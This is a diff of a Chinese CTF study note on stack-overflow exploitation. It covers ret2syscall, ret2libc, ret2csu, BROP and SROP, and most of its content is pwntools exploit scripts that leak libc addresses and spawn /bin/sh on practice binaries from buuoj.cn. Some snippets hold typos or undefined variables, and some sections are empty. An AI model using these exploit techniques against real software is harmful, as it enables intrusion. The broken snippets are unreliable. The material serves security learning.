@@ -149,49 +149,52 @@ p.interactive()
 python -m pip install ROPgadget
 #在程序的.text段中寻找，可以组成payload的函数
 ROPgadget --binary pwn --only "pop|ret"
-#所以要构造sys_execve(),寄存器必须是以下值，才能执行int 0x80
-eax=0xb ebx='/bin/sh' ecx=0 edx=0
+#构造execve("/bin/sh",0,0),寄存器必须是以下值，才能执行int 0x80
+
+eax=0xb ebx='/bin/sh' ecx=0 edx=0	#32位设置
+rax=0x3b rdi='/bin/sh' rdx=0 rsi=0	#64设置
 #写入"/bin/sh"的地方有
 
 ```
 
 ### 32位
 
-32位程序是利用int 80来进行系统调用read函数，也可以直接使用已有的read函数
+32位程序是利用int 80来进行系统调用read函数，也可以直接使用已有的read函数，但是得需要pop_ret的地址满足条件才行
 
-```
+```python
+from pwn import *
+context(os='linux',arch='i386',log_level='debug')
+#p = remote('node.buuoj.cn',8888)
+p = process('./pwn')
+elf = ELF('./pwn')
+pop_eax = 0x12345678
+pop_edx_ecx_ebx = 0x12345678
+int_80 = 0x12345678
+#bin_sh = 0x12345678 当ELF中存在，可直接调用
 
+payload = flat(cyclic(60),p32(pop_eax),p32(0xb),p32(pop_edx_ecx_ebx),p632(0),p32(0),p32(sh_addr),p32(int_80))
+p.sendline(payload)
+p.interactive()
 ```
 
 ### 64位
 
 64位程序利用syscall来进行系统调用read函数写入"/bin/sh"，也可以直接使用已有的read函数
 
+利用execve系统函数进行调用，设置rax=0x3b
+
 ```python
-from pwn import *
-elf = ELF('./pwn')
-#p = remote('node.buuoj.cn',8888)
-p = process('./pwn')
 
-pop_eax = 0x12345678
-pop_edx_ecx_ebx = 0x12345678
-int_80 = 0x12345678
-
-#bin_sh = 0x12345678 当ELF中存在，可直接调用
-payload = flat(cyclic(60),p32(pop_eax),p32(0xb),p32(pop_edx_ecx_ebx),p632(0),p632(0),p32(sh_addr),p32(int_80))
-p.sendline(payload)
-p.interactive()
 ```
 
 # ret2libc
 
 ## 原理
 
-利用栈溢出漏洞，劫持返回地址，利用程序已链接库中的函数，来进行取shel，l不需要注入自定义的 shellcode 或者系统调用指令。需要了解libc和延迟绑定，了解ELF执行后，第一次调用函数，会实现一个延迟绑定当函数没system和"/bin/sh"时，就需要调用libc里面的，首先**找到libc的基地址**，通过已知函数的地址，输出在libc中的地址，来计算基地址
-
-需要Libcsearcher库
+利用栈溢出漏洞，劫持返回地址，利用程序已链接库中的函数，来进行取shell不需要注入自定义的 shellcode 或者系统调用指令。需要了解libc和延迟绑定，了解ELF执行后，第一次调用函数，会实现一个延迟绑定当函数没system和"/bin/sh"时，就需要调用libc里面的，首先**找到libc的基地址**，通过已知函数的地址，输出在libc中的地址，来计算基地址
 
 ```shell
+#需要Libcsearcher库
 git clone https://github.com/lieanu/LibcSearcher.git
 sudo python set-up.py develop
 rm -rf Libc-database
@@ -203,8 +206,33 @@ git clone https://github.com/niklasb/libc-database.git
 
 ## 32位
 
-```
+```python
+from pwn import *
+from LibcSearcher import *
+context(os='linux',arch='i386',log_level='debug')
+p=remote('node5.buuoj.cn',29779)
+#p=process('./2018_rop')
+elf=ELF('./2018_rop')
 
+main=elf.sym['main']
+write_plt=elf.plt['write']
+write_got=elf.got['write']
+
+payload1=flat(cyclic(0x8c),p32(write_plt),p32(main),p32(1),p32(write_got),p32(4))
+p.sendline(payload1)
+write_addr=u32(p.recv(4))
+print(hex(write_addr))
+
+libc=LibcSearcher('write',write_addr)
+base=write_addr-libc.dump('write')
+system_addr=base+libc.dump('system')
+bin_sh=base+libc.dump('str_bin_sh')
+print(hex(system_addr))
+print(hex(bin_sh))
+
+payload2=flat(cyclic(0x8c),p32(system_addr),p32(1),p32(bin_sh))
+p.sendline(payload2)
+p.interactive()
 ```
 
 
@@ -232,7 +260,6 @@ p.sendlineafter('choice!\n',b'1')
 payload = flat('\0',b'A'*0x57,p64(pop_rdi),p64(puts_got),p64(puts_plt),(main_addr))
 p.sendlineafter('encrypted\n',payload)
 puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) #接收puts地址
-puts_addr=u64(p.recvuntil('\n')[:-1].ljust(8,b'\x00'))
 ########本地libc找地址#########
 #libc_put = libc.sym['puts']
 #base = puts_addr-libc_put
@@ -240,7 +267,7 @@ puts_addr=u64(p.recvuntil('\n')[:-1].ljust(8,b'\x00'))
 #system_addr = libc_system
 #libc_bin = 0x19604F
 #bin_sh = base +libc_bin
-
+##############################
 
 #利用LibcSearcher找到地址
 libc = LibcSearcher('puts',puts_addr)
@@ -255,6 +282,94 @@ p.sendlineafter('encrypted\n',payload2)
 p.interactive()
 ```
 
+# ret2cus
+
+利用初始化函数__libc_csu_init
+
+一般的程序都会调用libc中的函数，而此函数便是来将libc初始化的，故此函数几乎是每一个程序所必备的。一般可以用来让`rdx=0`
+
+## 32位
+
+32位采用`int 80`指令调用底层
+
+## 64位
+
+![image-20240513212502274](image/image-20240513212502274.png)
+
+可以看到`pop r13`和`mov rdx,r13`只要把`r13=0`，就可以把`rdx=0`,64位采用`syscall`指令
+
+```python
+from pwn import *
+context(os='linux',arch='amd64',log_level='debug')
+p=remote('node5.buuoj.cn',28262)
+#p=process('./ciscn_s_3')
+elf=ELF('./ciscn_s_3')
+pop_rdi=0x4005a3	#rdi = 0
+pop_rsi_r15=0x4005a1	#rsi = 0
+pop_rdx_6=0x40059A	#csu第一段函数
+mov_rdx_0=0x400580	#csu第二段函数，里面有call r12的函数
+mov_rax_0x3b=0x4004E2	#程序给的系统调用函数,mov rax,0x3b ret
+syscall=0x400517
+vuln_addr=elf.sym['vuln']
+
+payload1=flat(b'/bin/sh\x00',cyclic(0x8),p64(vuln_addr))#由于没有pop rbp，直接覆盖到old_rbp就可以，所有少了8字节
+p.send(payload1)
+p.recv(0x20)
+bin_sh=u64(p.recv(8))-0x118 #泄露/bin/sh的真实地址
+print(hex(bin_sh))
+
+payload2=flat(b'/bin/sh\x00',cyclic(0x8),p64(pop_rdx_6),0,0,p64(bin_sh+0x50),0,0,0,p64(mov_rdx_0))
+#bin_sh+0x50是对于下面pop_rdi=0x4005a3地址的偏移，call的push下一地址会和执行的pop_rdi相互抵消了，所有实际上就是绕过了call函数，继续执行下面的函数
+payload2+=flat(p64(pop_rdi),p64(bin_sh),p64(pop_rsi_r15),0,0,p64(mov_rax_0x3b),p64(syscall))
+p.send(payload2)
+p.interactive()
+```
+
+
+
 # ROP编程
 
 ## 栈迁移
+
+# BROP
+
+`brop`是一项非常巧妙的技术，在无法获取到二进制程序和`libc`的情况下进行远程溢出
+
+## 寻找溢出长度
+
+```python
+from pwn import *
+def getsize():
+  i=1
+  while 1:
+    try:
+      p=remote('node5.buuoj.cn',9999)
+      p.recvuntil('password?\n')
+      p.send(b'A'*i)
+      data=p.recv()
+      p.close()
+      if not data.startswith('No password'):
+        return i-1
+      else:
+        i+=1
+     except EOFError:
+        p.close()
+        return i-1
+      
+size=getsize()
+print(size)
+```
+
+## 寻找stop gadgets
+
+## 寻找 brop gadgets
+
+## 寻找 puts 函数的 plt 地址
+
+## 寻找 puts 函数的 got 地址并 [dump](https://so.csdn.net/so/search?q=dump&spm=1001.2101.3001.7020) plt 表
+
+# SROP
+
+`Sigreturn`则是一种特殊的系统调用，它将程序的执行状态恢复到之前通过信号处理函数保存的状态，我们可以恶意构造`Sigreturn`函数进行篡改寄存器和栈，以达到getshell目的
+
+系统调用号查看路径`/usr/include/x86_64-linux-gnu/asm/unistd_64.h`或者`unistd_32.h`
